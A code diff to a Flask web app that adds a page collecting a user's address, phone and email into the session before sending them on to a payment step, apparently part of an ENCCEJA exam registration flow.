@@ -119,6 +119,32 @@ def encceja_info():
     
     return render_template('encceja_info.html', user_data=user_data)
 
+@app.route('/endereco', methods=['GET', 'POST'])
+def endereco():
+    """Página de coleta de endereço"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    if request.method == 'POST':
+        # Atualizar dados do usuário com endereço
+        user_data.update({
+            'cep': request.form.get('cep', ''),
+            'logradouro': request.form.get('logradouro', ''),
+            'numero': request.form.get('numero', ''),
+            'complemento': request.form.get('complemento', ''),
+            'bairro': request.form.get('bairro', ''),
+            'cidade': request.form.get('cidade', ''),
+            'estado': request.form.get('estado', ''),
+            'telefone': request.form.get('telefone', ''),
+            'email': request.form.get('email', '')
+        })
+        session['user_data'] = user_data
+        return redirect(url_for('pagamento'))
+    
+    return render_template('endereco.html', user_data=user_data)
+
 @app.route('/validar-dados', methods=['GET', 'POST'])
 def validar_dados():
     """Página de validação de dados"""
